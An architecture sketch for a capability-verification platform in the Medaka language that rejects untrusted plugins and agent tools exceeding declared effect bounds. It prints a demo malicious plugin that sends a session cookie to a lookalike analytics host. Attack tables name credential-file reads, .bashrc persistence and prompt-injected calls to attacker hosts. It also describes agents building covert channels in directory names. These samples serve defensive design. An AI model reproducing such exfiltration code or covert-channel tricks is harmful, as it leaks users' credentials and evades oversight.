# The capability platform — runtime/product architecture

**Status:** OPEN — direction / architecture sketch, no code written. What remains:
the whole thing; this doc is the target architecture, not started. Both stated
prerequisites are now met (Phase 146 capability-effects: IMPLEMENTED; WasmGC
backend: shipped, gap census 1428→0) — the platform itself is blocked on product
scoping only, not on either prerequisite. This is the *product* built
on top of the language feature in [`CAPABILITY-EFFECTS.md`](./CAPABILITY-EFFECTS.md):
the runtime/platform that turns Medaka's effect-as-capability-manifest into
automated trust for untrusted edge/plugin code. Read CAPABILITY-EFFECTS.md first —
it defines the effect-tracking model this depends on.

**Retargeted 2026-08-26 (§7d, §7e).** The original framing aimed at edge/plugin
providers (Fastly / Cloudflare / Fermyon). The better-fitting first target is now
the **agent tool boundary** — an LLM agent runtime invoking third-party tools —
because it is the one host where §5's structured plugin interface is *already
imposed by the protocol* rather than something the platform must invent and sell.
The architecture below is unchanged; only the first target and the demo are. The
edge-provider examples (§6, §7, §7b) remain valid and are still the clearest
statements of Levels 1 and 2.

This is the "Rails, not Ruby" artifact: the flagship that gives the wedge a reason
to exist. It is a large, separate build and explicitly *not* near-term work; this
doc exists so the architecture is on record while it's fresh.

---

## 1. The stack

```
┌─────────────────────────────────────────────────────────────┐
│  Submitted Medaka plugins (UNTRUSTED)                        │
│  — capability manifest encoded in the types (effect rows)    │
├─────────────────────────────────────────────────────────────┤
│  Medaka capability platform (TRUSTED — this is what we build)│
│  — compiles source, verifies effect bounds, provisions       │
│    least-privilege deployments, owns plugin composition      │
├─────────────────────────────────────────────────────────────┤
│  Host: agent runtime (§7d) | edge provider | WASI host       │
│  — accepts Wasm, grants COARSE capabilities (net on/off, KV) │
│  — memory sandbox + resource metering (CPU/mem/wall)         │
└─────────────────────────────────────────────────────────────┘
```

The bottom layer is any host that runs Wasm and grants coarse capabilities. §6–§7b
work it as an edge provider; §7d works it as an agent tool runtime. Nothing above
that layer changes between the two.

The edge provider already gives **memory sandboxing** and **coarse, per-instance
capability control via host imports** (don't link `fetch` → the module can't make
network calls). Our platform adds the **fine-grained, function-level, statically
verified** layer on top, and uses the coarse layer as a backstop.

## 2. Trust model (TCB)

- **Untrusted:** the plugin author and their submitted source.
- **Trusted (the TCB):** (a) the Medaka compiler — it must emit Wasm whose host
  imports match the verified effect manifest; (b) the platform's verification +
  provisioning logic; (c) the edge provider's coarse sandbox, as the outer fence.
- **Two fences, defense in depth:** the effect check is the *inner* fence (fine,
  static); the edge provider's "no network binding" is the *outer* fence (coarse,
  runtime). A soundness bug in the effect checker degrades to "coarse sandbox still
  holds," not "full breach." Always provision the coarse layer to match the
  manifest so the two agree.
- **Load-bearing constraint: the platform compiles the source itself; it must NOT
  accept pre-compiled Wasm.** The manifest is only trustworthy if the trusted
  compiler derived it from source. Accepting Wasm throws away the effect types and
  drops you back to coarse Wasm-level analysis.

## 3. The pipeline

```
submit Medaka source
   │
   ▼
[compile with trusted Medaka compiler]          ── type error → reject
   │   effect rows inferred + SOUND
   ▼
[verify against policy]
   • required plugin interface present?
   • each interface fn's effect row ⊆ its declared bound?   ── exceeds → reject (precise reason)
   │
   ▼
[derive manifest]   = the verified capability set (cannot lie; compiler-derived)
   │
   ▼
[provision least-privilege deployment]
   • map granted effect labels → edge host imports
   • leave UNGRANTED labels unlinked (the backstop)
   • parameterized caps (Fetch "x.com") → inject a constrained PROXY host fn
   │
   ▼
[edge provider runs the Wasm]   ← coarse sandbox + resource metering underneath
```

## 4. Verification mechanism

The compiler computes every function's effect row by inference and **soundly
guarantees** it (a function cannot perform an effect outside its row). A caller's
row is the union of everything it transitively calls. Two consequences drive the
whole design:

1. **Bound the entry point, not every function.** If the designated entry point
   typechecks at its required signature, *everything reachable from it* is bounded —
   no call-graph inspection needed. Soundness + transitivity does the work.
2. **The automation primitive is effect-row subsumption (set containment).** Policy
   declares an upper bound; the plugin's row must be a subset:
   ```
   allowed = { Cache, Log, Fetch }
   { Cache, Log }      ⊆ allowed  → ACCEPT
   { Cache, Log, KV }  ⊄ allowed  → REJECT ("uses KV, not permitted")
   ```
   Over a finite, declared label set this is a trivial, total check done as a
   byproduct of compilation.

### Three levels of guarantee (choose per plugin category)

- **Level 1 — capability bound.** "Can't fetch at all" / "only `{Cache, Log}`."
  Just the entry-point subsumption check. ~80% of real policies. (Example A.)
- **Level 2 — capability segregation by construction.** "Reads credentials AND
  fetches, but credentials can't reach an arbitrary network endpoint." Achieved by
  a **structured plugin interface**: the capability-disjoint pieces are *separate
  required functions with separate bounds*, and the **platform's trusted harness
  owns the composition** — the plugin never writes the merged handler. The
  information-flow property emerges from the interface shape (what data is allowed
  to cross between the pieces), not from analyzing a merged function. (Example B.)
- **Level 3 — full information-flow / taint typing** (track per-value provenance,
  à la Jif/FlowCaml). Heavy, ergonomically taxing, **not planned** — Level 2 buys
  the same practical guarantee via architecture for far less.

## 5. The plugin SDK model (the central architectural idea)

The platform defines, per plugin category, a **structured interface**: the exact
functions a plugin must provide, each with a declared effect bound, plus the
boundary data types that may cross between capability-disjoint pieces. The
platform's *trusted harness* calls those functions and wires them together. The
plugin author fills in bounded pieces; they never control the composition or widen
the boundary types. This is what makes Level-2 guarantees automatic: verification
reduces to independent per-function subsumption checks, and the harness (not the
plugin) decides what data flows where.

**Boundary types are the declassification points.** Because the platform owns the
types that cross between, say, the request-reading piece and the network piece, it
controls exactly what information is *allowed* to cross. Designing those types
narrowly is how you get the security property.

## 6. Worked example A — Shopify-Functions-style discount calculator (Level 1)

A discount function computes a price reduction from cart contents. It needs **no IO
at all** — pure computation. The risk: a malicious one exfiltrates cart contents
(customer PII, purchase history) to an external server.

**Platform interface:**
```
-- The ONLY function the platform calls. Required signature, pure bound:
calculate : Cart -> <> Discount        -- <> = no effects whatsoever
```

**Verification:** compile the submission; check `calculate`'s inferred row ⊆ `{}`.
That single check bounds the entire reachable program to *pure*.

**Malicious submissions and the exact trip-point:**
| Attempt | Effect row becomes | Check | Result |
|---|---|---|---|
| POST cart to `evil.com` | `{ Fetch }` | `{Fetch} ⊄ {}` | **reject** ("calculate must be pure; uses Fetch") |
| Read an env var / secret | `{ Env }` | `{Env} ⊄ {}` | **reject** |
| Log cart to a capturable sink | `{ Log }` | `{Log} ⊄ {}` | **reject** |
| Stash data in KV for later exfil | `{ KV }` | `{KV} ⊄ {}` | **reject** |

There is no way to phrase "send the cart somewhere" that doesn't introduce an
effect outside `{}`, and the bound is verified by the compiler, not by review. A
pure discount calculator is *provably* a pure discount calculator.

## 7. Worked example B — edge auth middleware (Level 2, segregation)

Auth middleware sees every request's credentials (session cookie / bearer token).
The catastrophe: a compromised auth plugin exfiltrates every user's token. It
legitimately needs to (a) read the request, and (b) talk to an identity provider —
so a flat capability bound can't help (it needs both `ReadReq` and `Fetch`). This
is the segregation case.

**Platform interface (three bounded pieces + the harness owns composition):**
```
-- 1. Pull the credential out of the request. Reads request; NO network.
extractToken : Request -> <ReadReq> Option Token

-- 2. Verify the token against the IdP. Network to the IdP ONLY; CANNOT read the
--    request (so it cannot scoop up other cookies/headers and ship them).
verify : Token -> <Fetch "idp.example.com"> AuthResult

-- 3. Turn the result into an allow/deny decision. Pure.
decide : AuthResult -> Decision
```

**The platform's trusted harness (NOT written by the plugin author):**
```
runAuth req =
  match extractToken req
    None      => Deny
    Some tok  =>
      let result = verify tok      -- only `tok` crosses to the network side
      decide result
```

**What the types prove, automatically:**
- `verify : Token -> <Fetch "idp.example.com"> AuthResult` has **no `ReadReq`**, so
  it physically cannot read cookies/headers other than the `Token` it's handed — it
  can't harvest *other* credentials or PII to exfiltrate.
- Its `Fetch` is pinned to `idp.example.com`, so even the data it *does* hold can't
  go to `evil.com`.
- `extractToken` can read the request but has **no `Fetch`** — it can't exfiltrate.
- `decide` is pure.
- The only value crossing from the request-reading side to the network side is
  `Token` (a platform-owned boundary type) — the harness, not the plugin, decides
  that.

**Malicious submissions and the exact trip-point:**
| Attempt | Trips on | Result |
|---|---|---|
| Add `fetch "evil.com"` inside `verify` | `{Fetch evil} ⊄ {Fetch idp}` (parameterized bound) | **reject** |
| Read cookies inside `verify` | needs `ReadReq`; `{ReadReq, Fetch idp} ⊄ {Fetch idp}` | **reject** |
| Exfiltrate from `extractToken` | needs `Fetch`; `{ReadReq, Fetch} ⊄ {ReadReq}` | **reject** |
| Widen `verify` to take the whole `Request` | signature ≠ required interface (`verify : Token -> …`) | **reject** (interface mismatch) |
| Stash the token in KV from `extractToken` | needs `KV`; `⊄ {ReadReq}` | **reject** |

The last row is the subtle one: the plugin can't "just pass the whole request to
the network side," because the platform's harness controls the call (`verify tok`)
and the required signature only gives `verify` a `Token`. **The interface contract
is what forecloses the data-smuggling path** — the thing manual review would
otherwise have to catch.

## 7a. Effect labels → host capabilities; parameterized capabilities → proxies

- Each effect label maps to a host import the edge provider supplies. Granting a
  label = linking its host fn; denying = leaving it unlinked.
- The provider's imports are **coarse** ("network on"). A parameterized capability
  like `<Fetch "idp.example.com">` (single allowed domain) can't be enforced by a
  coarse "network on" import. The platform **injects a constrained proxy host
  function** that permits only that domain — adding enforcement the provider lacks.
  This is exactly the platform's value-add over a thin wrapper.

## 7b. Worked example C — multi-plugin personalization pipeline (composition, scoped state, per-install policy)

Scenario: an e-commerce host lets a store owner install several third-party "edge
personalization" plugins that run in a pipeline on each page request. Store #42
installs three, from three different untrusted vendors:
- `geoLocalize` — picks a locale from request geo. Needs `<GeoIP>`; no network, no
  storage.
- `abTest` — assigns/persists an experiment bucket. Needs `<KV "ab:store42:abtest">`
  (its own namespace); no network, no raw request.
- `recoWidget` — fetches recommendations from the vendor API and injects a widget.
  Needs `<Fetch "api.recovendor.com">`; no storage, no geo.

New concepts beyond A/B: **(1)** composing *mutually-untrusting* plugins on one
path, **(2)** scoped *stateful* capabilities, **(3)** per-install policy as lattice
narrowing, **(4)** the memory-vs-capability isolation distinction.

**Pipeline interface — each plugin is one stage; the platform owns the thread:**
```
-- Context is a PLATFORM-OWNED boundary type; plugins touch it only via typed
-- accessors the platform exposes — it is the SOLE cross-plugin channel.
geoLocalize : Context -> <GeoIP> Context
abTest      : Context -> <KV "ab:store42:abtest"> Context
recoWidget  : Context -> <Fetch "api.recovendor.com"> Context
```
```
-- trusted harness (NOT plugin-authored):
runPipeline req =
  let c0 = mkContext req     -- platform builds the initial Context; controls what's exposed
  render (recoWidget (abTest (geoLocalize c0)))
```

**(1) Inter-plugin isolation — two complementary mechanisms.**
- *Capability isolation (effects):* each stage's row is verified independently.
  `recoWidget` has `Fetch` but no `KV`/`GeoIP`; `abTest` has scoped `KV` but no
  `Fetch`. A compromised `recoWidget` provably cannot read the A/B store; `abTest`
  provably cannot phone home.
- *Memory isolation (Wasm boundary):* capability isolation is **not** memory
  isolation — Wasm isolates an *instance* from the host, not sub-parts of one
  module from each other. So mutually-untrusting plugins must be **separate Wasm
  components/instances** (memory-isolated by the Wasm boundary), with the harness
  threading `Context` *across* the component boundary — exactly what the component
  model is for. Effects give capability isolation + the manifest; the component
  boundary gives memory isolation.
- *The `Context` is the only channel.* A plugin sees only the typed `Context` fields
  the platform exposes (`locale`, `bucket`) — never another plugin's internals,
  never the raw request unless the platform chose to expose it. Cross-tenant
  declassification is a platform decision, not a plugin one.

**(2) Scoped stateful capabilities.** `<KV>` is too coarse — it would let `abTest`
read the store's order data or another plugin's keys. The capability is
**parameterized with a namespace**: `<KV "ab:store42:abtest">`. The platform injects
a KV proxy that confines every key to that prefix, so `abTest` physically cannot
address keys outside it. (Same proxy pattern as the pinned `Fetch` domain in §7a —
parameterization carrying a *resource scope* rather than a network destination.)

**(3) Per-install policy as lattice intersection.** The platform sets a **category
ceiling** per plugin type; the store owner's **install policy** can only *tighten*;
the effective bound is the intersection, and the plugin's verified row must be ⊆ it:
```
recoWidget category ceiling : { Fetch recovendor-domains }
store42 install policy       : { }   (privacy-conscious: "no plugin may use the network")
effective bound = ceiling ∩ policy : { }
recoWidget verified row      : { Fetch "api.recovendor.com" }  ⊄ { }
   → recoWidget REJECTED FOR THIS INSTALL ("requires Fetch, denied by your policy")
```
The same plugin binary installs fine for a permissive store and is refused for
store42 — decided by set intersection + subsumption, no re-review. The customer is
a first-class policy actor.

**(4) Subdividing a coarse grant among co-resident tenants — the payoff.** The
combined deployment's *coarse* provisioning is the **union** of what the plugins
need (network + KV + geo); the host grants the deployment all three. Yet each plugin
is provably bounded *tighter* than the union: `recoWidget` can't touch KV, `abTest`
can't fetch. **The effect layer safely partitions one coarse grant among
mutually-untrusting tenants** — the multi-tenant form of "granularity below the
import" that no host-import model provides. With one component per plugin, each is
also only *linked* the imports its manifest declares, so the partition holds at the
Wasm boundary too, not just in the types.

**Malicious trip-points:**
| Attempt | Trips on |
|---|---|
| `recoWidget` reads A/B KV to profile users | needs `KV`; `⊄ {Fetch recovendor}` |
| `abTest` POSTs bucket+PII to a tracker | needs `Fetch`; `⊄ {KV ab:…}` |
| `abTest` reads key `orders:store42:*` | KV proxy confines to `ab:store42:abtest:*` → denied at the namespace boundary |
| `recoWidget` reads another plugin's `Context` internals | only typed fields exposed; no accessor exists |
| any plugin uses the network under store42's policy | `⊄ {}` effective bound → rejected at install |

## 7c. The minimal "wow" demo (the first shareable artifact)

The thinnest end-to-end slice that lands the punch — and the concrete target that
near-term PLAN items (fine-grained labels + a thin harness) aim at. Guiding
principle: **truthful** (the guarantee is real) but **minimal** (stub everything
that isn't the story). **The story is compile-time capability verification, which is
decoupled from the backend** — it's true and compelling on the *existing tree-walker*,
well ahead of the native backend (which, at the current cadence, is itself months —
not years — away). That decoupling is the point: the
"make-people-care" milestone is reachable cheaply.

**One line:** *Submit an AI-generated edge plugin that tries to exfiltrate user
data. A JS platform would deploy it. Medaka's compiler rejects it automatically — no
human reviewed it — because it proved the plugin reaches the network, even though the
call is buried several helpers deep.*

**The ~90-second script:**
1. "Contract for an edge transform plugin: may use `<Cache, Log>`, nothing else."
2. Submit a **good** plugin → `✅ accepted` → it *runs* (interpreter) and rewrites a
   header. Safe code works.
3. Submit a **malicious** plugin that looks like normal analytics → `❌ rejected`:
   ```
   transform requires <Fetch> — not permitted by policy {Cache, Log}
     reached via: transform → tagVisit → recordMetric → sendBeacon → fetch
   ```
4. Punchline: no human looked at it; the exfiltration was four calls deep, past where
   review and `grep` give up; the type system found it.

**The malicious plugin — exfiltration buried deep (what makes it credible):**
```
sendBeacon (url, body) = fetch url body                       -- uses <Fetch>
recordMetric ev        = sendBeacon ("https://analytics-cdn.io/c", ev)
tagVisit req           = recordMetric (sessionCookie req)     -- ships the cookie
transform req =
  let _ = tagVisit req            -- the poison: pulls <Fetch> up the call graph
  cacheAndReturn (rewrite req)
```
Effect **propagation** carries `<Fetch>` up `fetch → sendBeacon → recordMetric →
tagVisit → transform`; inferred row `{Fetch, Cache, Log} ⊄ {Cache, Log}` → reject,
**with the chain printed.** The "via" chain is the money shot — it shows this is a
*proof through the call graph*, not `grep fetch`, and is a live demonstration of why
soundness (already shipped) matters.

**The harness (~150–250 lines, the "automated reviewer"):** submitted file → compile
+ typecheck → read `transform`'s inferred effect row → check `⊆ policy` → accept (and
run) or reject with reason + chain. That is the entire demo "platform."

**What it needs to build:**
| Piece | Status |
|---|---|
| Effect soundness/propagation (makes the rejection trustworthy) | ✅ done (Phase 79/146) |
| User-definable fine-grained labels (`effect Fetch/Cache/Log`) | ✅ done (Phase 146 gap-2) |
| The harness (`medaka check-policy`) | ✅ done — `demo/` + native CLI (WS-1a, 2026-06-21; was `bin/main.ml`) |
| LLVM / WasmGC / real edge host / parameterized effects / full platform | ❌ not needed |

The demo is **complete and runnable** (`demo/plugin_good.mdk`, `demo/plugin_malicious.mdk`,
`medaka check-policy --policy Cache,Log <plugin.mdk>`).

So the demo ≈ **the next roadmap item (gap-2 labels) + a thin harness, on the
existing interpreter.**

**Credibility checklist (don't skip):**
- Malicious code must be **plausible** (buried, lookalike domain, reads like real
  telemetry) — if it's obviously evil, skeptics say "review would catch that."
- Bury `fetch` **several calls deep** — proves proof-through-call-graph, not
  pattern-matching.
- **Show the good plugin run** — "safe works, unsafe blocked," both halves.
- Keep plugin code **clean/readable** — the anti-ivory-tower identity.
- **Scope the claim honestly** — at demo stage the plugin runs on the tree-walker
  (not memory-sandboxed, not fast). The demo proves *automated capability
  verification* (the differentiated part); native/Wasm sandbox + perf is the
  production build-out. Say so — a technical audience will ask.

**Format:** a writeup/blog post (the thing that travels — Show HN / Lobsters / Wasm +
PL crowds) + a ~90s asciinema + a runnable repo. A web playground (removes the
install barrier) is the highest-leverage *next* step; defer past v1.

**Stretch upgrades (after the base lands), by visceral punch:** (1) generate the
malicious plugin with an actual LLM in the demo (AI-guardrail thesis, ~zero extra
build); (2) parameterized pinned domain (Phase 146b) — "allowed IdP passes,
`evil.com` rejected"; (3) the segregation example (§7) — "reads cookies AND fetches,
provably can't send cookies to the network."

## 7d. Worked example D — the agent tool boundary (Level 2, interface supplied by the protocol)

**Why this example was added (2026-08-26).** §9's first open question used to read
"which edge provider to target first." That framing predates the target that now
fits this architecture best. An **agent host** — an LLM agent runtime that invokes
third-party *tools* on a user's behalf — has the same shape as the edge-plugin host
of §6–§7b, with one decisive advantage: **the structured interface of §5 does not
have to be invented or sold.** A tool is already a named function with a typed
input, a typed output, invoked by a trusted harness (the runtime) that the tool
author does not control. Everywhere else in this document the platform must impose
the SDK model on an ecosystem that would rather ship a merged handler; here the
protocol already imposes it, which makes **Level 2 available by default rather than
by persuasion**.

The status quo it displaces: a tool server is an ordinary process holding the
ambient authority of the user who installed it, and the security model is that
somebody read the README. Per-call approval prompts and path allowlists are the
current mitigation — all dynamic, all per-call, none compositional, and none able
to answer "what can this tool reach, *including through its dependencies*, before
I run it."

**Platform interface (one bound per tool; the runtime owns dispatch):**
```
-- Each tool is a separate required function with its OWN bound. The runtime --
-- not the tool author -- owns dispatch, argument marshaling, and the transcript.
readDoc   : DocRef  -> <FileRead "~/notes/**"> Text
searchWeb : Query   -> <Net "api.searchvendor.com"> Results
writeNote : NewNote -> <FileWrite "~/notes/**"> Unit
```

**What the types prove, automatically:**
- `readDoc` has `FileRead` pinned to one subtree and **no `Net`** — it cannot
  exfiltrate what it reads, whatever the model asks of it. This is the property
  prompt-injection defenses currently chase at runtime and cannot guarantee.
- `searchWeb` has `Net` pinned to one vendor and **no `FileRead`** — a compromised
  search tool cannot reach the notes it sits beside.
- `writeNote` can write only under the notes subtree — not `~/.bashrc`, not
  `~/.ssh/authorized_keys`.
- The deployment's *coarse* grant is the union `{FileRead, Net, FileWrite}`, yet no
  single tool holds the **pair** that makes exfiltration possible. This is §7b(4)'s
  "safely partition one coarse grant among mutually-untrusting tenants," applied to
  tools instead of edge plugins.

**Malicious submissions and the exact trip-point:**
| Attempt | Trips on | Result |
|---|---|---|
| `readDoc` POSTs note contents to a paste site | needs `Net`; `{FileRead, Net} ⊄ {FileRead "~/notes/**"}` | **reject** |
| `readDoc` reads `~/.aws/credentials` | prefix param: `FileRead "~/.aws/*" ⊄ FileRead "~/notes/**"` | **reject** |
| `searchWeb` reads local files to "enrich" the query | needs `FileRead`; `⊄ {Net "api.searchvendor.com"}` | **reject** |
| `searchWeb` calls an attacker-named host after an injected instruction | `Net "evil.com" ⊄ Net "api.searchvendor.com"` | **reject** |
| `writeNote` appends to `~/.bashrc` for persistence | `FileWrite "~/.bashrc" ⊄ FileWrite "~/notes/**"` | **reject** |
| any tool shells out to do the above indirectly | needs `Exec`; `⊄` all three bounds | **reject** |

The fourth row is the one that carries the argument: **the bound is a property of
the compiled artifact, not of the conversation.** No sequence of model tokens can
widen it. A runtime approval prompt cannot make that promise, because at the moment
it fires the authority is already ambient and the only question left is whether a
human clicks yes.

**What this does NOT cover — state it before a skeptic does.** The confused deputy
survives: `readDoc` returns note text into a transcript, and `searchWeb` — a
*different* tool, legitimately holding `Net` — sends it onward. Each tool did
exactly what it was licensed to do; the leak is in the composition. That is a Level
2 *harness* problem, identical in shape to §7's boundary types: the runtime owns
what crosses between tools, so the runtime must decide it deliberately. Effect rows
bound authority, not information flow (§8), and this is precisely where the agent
host still has design work that types will not do for it. Claiming otherwise is the
fastest way to lose a technical audience.

## 7e. The dogfood demo (cheapest credible artifact, and it answers §9)

§7c's demo is complete and runnable, but its plugin is a fictional edge transform.
The agent-tool framing above has a strictly cheaper and more credible artifact
available, because **the tree already contains an agent tool server written in
Medaka**: `compiler/tools/mcp.mdk` (`medaka mcp`, 8 tools over stdio).

The demo is therefore not a mock:
1. `medaka manifest compiler/tools/mcp.mdk --fn <tool>` — emit the compiler-derived
   capability manifest of a **real, in-use** tool server, per tool.
2. Show the host refusing a capability the manifest does not claim.
3. Show the manifest-widening gate: adding a dependency that quietly pulls in
   `<Net _>` turns the committed manifest golden red, so widening is a reviewed
   diff rather than a silent fact. (The emitter and gate harness exist —
   `test/manifest_emit.sh`, WS-1c; the golden-diff gate does not yet.)

This also settles §9's last open question ("whether the harness/SDK is itself
written in Medaka") by construction, and it is the first artifact in this document
whose subject is production code rather than a worked hypothetical.

**Prerequisites this demo actually needs** (the same three as the platform's first
real bound):
| Piece | Status |
|---|---|
| Effect soundness/propagation + fine-grained labels | ✅ done |
| `medaka manifest` TOML emission | ✅ done (WS-1c, `test/manifest_emit.sh`) |
| Parameter-level policy compare (`--allow 'Net=host/*'`) | ❌ WS-1b — `check-policy` is still BARE-LABEL |
| A `Net` host import in the wasm inventory (somewhere to cash the row in) | ❌ not present — the import surface is IO/file/env/args |
| Manifest-widening golden gate | ❌ not built |

**⚠️ Found while probing this demo (2026-08-26): the verification step fails open.**
§3's pipeline lists *"required plugin interface present?"* as the first verify
bullet. It is not implemented. `runCheckPolicy` defaults a missing entry point to
the empty effect row (`compiler/tools/check_policy.mdk`, the `lookupAssoc fnName
effTable` arm), which is indistinguishable from a verified-pure function, so the
subsumption check passes and the plugin is **accepted**:

```
$ ./medaka check-policy demo/plugin_malicious.mdk --allow Cache,Log --fn transform
rejected. transform requires <Cache, Fetch>. Not permitted by policy {Cache, Log}
   reached via: transform → tagVisit → recordMetric → sendBeacon → fetch      # rc=1

$ ./medaka check-policy demo/plugin_malicious.mdk --allow Cache,Log --fn zzzNoSuchFn
accepted. zzzNoSuchFn requires only pure
   (no 'zzzNoSuchFn' binding in output)                                       # rc=0
```

The absence *is* noticed — but by `runPlugin`'s `lookupValue`, which runs **after**
the accept decision and only decorates the run output. The verdict never sees it.
`medaka manifest` has the same default: an unknown `--fn` prints an empty
`[package.capabilities]` block at rc 0, i.e. "this code holds no authority."

Why it matters more here than anywhere else in this document: the checker is the
single point where the whole architecture is cashed, and the direction of the bug
is toward permission. A submission that omits, renames, or subtly misspells the
required entry point passes verification; a platform pipeline that renames its
entry point silently starts approving everything. Every guarantee in §4, §6, §7,
§7b, and §7d is downstream of this one check, so it must reject on any "I cannot
find what you asked me to check." Tracked as **#2047 (check-policy fail-open on a missing entry point)**, S0, pinned
by `test/must_fail_fixtures/2047-check-policy-missing-entry-accepts/`. It is item 1
of §10's revised first increment.

Until WS-1b lands, the demo can only say "this tool uses the network," not "this
tool may reach exactly this host" — which is the differentiated half. Sequence
accordingly.

## 8. Honest boundaries / non-goals

- **Capability effects cover *authority*, not *resources*.** A pure function can
  still infinite-loop or allocate forever; timing side channels and CPU/mem
  exhaustion are **out of scope** — rely on the edge provider's resource metering
  and the Wasm memory sandbox. Capability effects are the *what-can-it-touch* layer,
  not a complete security story.
- **Covert channels remain.** Even segregated code can leak via timing (e.g. the
  pattern of IdP calls). The guarantee is "no *direct authority* to exfiltrate,"
  not "zero information leakage." Worked precedent, not a hypothetical: in the
  July 2026 OpenAI/Hugging Face incident, agents holding only their *intended*
  package-repository write access built a covert channel out of it — first as file
  contents, later by encoding messages in directory names — with no vulnerability
  involved at that step. Two modules each legitimately granted
  `<FileWrite "shared/*">` can do exactly the same thing here. Authority bounds are
  not an information-flow lattice; say so first, because this is the failure mode
  the public example is famous for.
- **No FFI/`unsafe` escape hatch in submitted code.** Any escape punches through
  the guarantee. Submissions must forbid it (or its presence counts as
  max-capability). This constrains what language features are allowed in plugins.
- **Soundness is now a security property.** Any hole in effect inference is a
  security hole — raising the correctness bar on Phase 146 and reinforcing the
  differential-testing discipline. The coarse sandbox backstop limits the blast
  radius of a soundness bug but is not an excuse for one.
  ⚠️ **This collides with an existing repo convention.** `test/must_fail_fixtures/`
  pins live soundness bugs on purpose, and RED is its healthy state — correct
  discipline for a research compiler, and quotable against us the day this is
  positioned publicly as a security property. Know the drain schedule of anything
  effect-related in that corpus *before* the positioning, not after.
- **Fail-open is the failure mode to hunt, and it is not hypothetical here.** A
  verification step that cannot find what it was asked to check must REJECT. See
  the `check-policy` missing-entry-point hole recorded in §7e (**#2047**) — the
  checker is the single point where this architecture's whole guarantee is cashed,
  so its default on any "I don't know" must be denial.
- **This is a large, separate, long-horizon build** — downstream of a working
  WasmGC backend and Phase 146. Not near-term. Documented now only to preserve the
  architecture.

## 9. Open questions

- ~~Which edge provider to target first (Fastly / Cloudflare / Fermyon / raw WASI)?~~
  **Answered 2026-08-26: neither, first.** The first target is the **agent tool
  boundary** (§7d) — the protocol supplies §5's structured interface for free, the
  "platform compiles from source" constraint of §2 is a natural ask of a tool
  registry and a hard sell to an edge provider, and the per-install-policy question
  below is a live, badly-solved problem there today. Edge providers remain a valid
  second target with the examples already written (§6, §7, §7b). ⚠️ **Adoption, not
  architecture, is the binding constraint**: a capability manifest is worth most to
  whoever runs a *marketplace* of code they did not write, which means the customer
  is a platform rather than a developer, and one adopter is the entire outcome.
  That is a high-variance bet and should be taken deliberately.
- Integration with the **Wasm component model / WASI Preview 2** capability story —
  reuse vs. layer on top; don't reinvent what the component model already expresses.
- **Per-install policy:** a customer installing a plugin may want to narrow its
  allowed set further than the category default — how is that expressed and checked?
- **Multi-plugin composition** on one request path: combined manifests, ordering,
  isolation between plugins (see Example C §7b).
- **Component granularity vs. cold-start cost:** one Wasm component per plugin gives
  memory isolation (Example C) but more instances + more cold starts per request;
  one shared module is cheaper but only gives *capability* isolation, not memory
  isolation. The right default per plugin category is open.
- **Boundary-type design discipline:** guidance/tooling so SDK authors design
  declassification types (`Token`, `Decision`) narrowly.
- Billing/quotas/observability for a multi-tenant plugin host.
- ~~Whether the harness/SDK is itself written in Medaka (dogfood)~~ — **settled by
  §7e**: `compiler/tools/mcp.mdk` is an agent tool server written in Medaka and
  already in the tree, so the dogfood demo's subject is production code. How its
  *trusted* status is established is still open.
- **Does the manifest survive the multi-module path?** `medaka manifest` reads a
  single file. A real tool server is a project; whether a row inferred through the
  single-file path agrees with the whole-project one is unverified, and it is a
  soundness question, not an ergonomics one.

## 10. Sequencing

Strictly downstream: **Phase 146 (capability-safe effects)** → **WasmGC backend**
(Stage 2, sibling to LLVM via the Core IR seam) → **this platform**. Both
prerequisites are now DONE (capability-effects IMPLEMENTED; WasmGC backend shipped)
— this doc is the target they aimed at, and is now blocked only on product scoping,
not on either prerequisite. The cheap early validation is still the *design* (worked
plugin interfaces like §6–§7), pressure-tested on paper against real plugin categories
before any runtime exists.

### When this starts, and what has to be true first (decided 2026-08-26)

**This work is sequenced AFTER the typechecker and emitter rearchitectures, and it
is not pitched to anyone outside the project until the security posture is buttoned
up.** That is a deliberate ordering, not a backlog accident, and the reason is §8's
"soundness is now a security property": the moment this document's claim is made to
an outside party, every effect-inference soundness bug becomes a security bug, and
every open S0 becomes something a skeptic can quote. Getting the rearchitectures
done first is what makes the claim survivable — so **the rearchitectures are the
prerequisite, and this platform waits on them.**

**The readiness test is derived, not asserted.** "Buttoned up" must mean a number
somebody can re-derive on demand, or it will mean whatever the person saying it
wants it to mean. The concrete gate: **no effect- or capability-related pin left in
`test/must_fail_fixtures/`** — that corpus deliberately holds live soundness bugs
(§8), so its effect-related subset draining to zero is exactly the statement
"soundness is no longer knowingly broken where this claim depends on it." Derive
the current subset; never trust a count written here:

```sh
for d in test/must_fail_fixtures/*/; do
  grep -qiE 'laund|effect var|effvar|effect row|effect arrow|capabilit' "$d/claim.txt" &&
    printf '%s\n' "$(basename "$d")"
done
```

⚠️ That is a keyword sweep, not an adjudicated classification — it over-matches
(a doctest-gate pin whose prose happens to say "effect") and can under-match a
laundering bug described in other words. Read the hits; the load-bearing subset is
the ones where **an effect escapes the row**, because that is exactly a manifest
that under-reports authority. Those are the pins that must be zero before the
claim in this document is made to anyone outside the project.

**Then, and only then, the first increment.** Three items, none of which is a
platform, which together are the smallest truthful version of the claim:
1. **Fail-open fix in `check-policy`** — a missing entry point must reject
   (§7e, **#2047**). The one exception to the sequencing above: this is a live S0
   in shipped tooling, so it is worth fixing on its own schedule rather than
   waiting for the platform. Every other guarantee here is downstream of it.
2. **WS-1b parameter-level policy compare** (`--allow 'Net=host/*'`) — without it
   the demo can only say "uses the network," which is the undifferentiated half.
3. **A `Net` host import** in the wasm inventory, so a parameterized row has an
   enforcement point to be cashed in at.
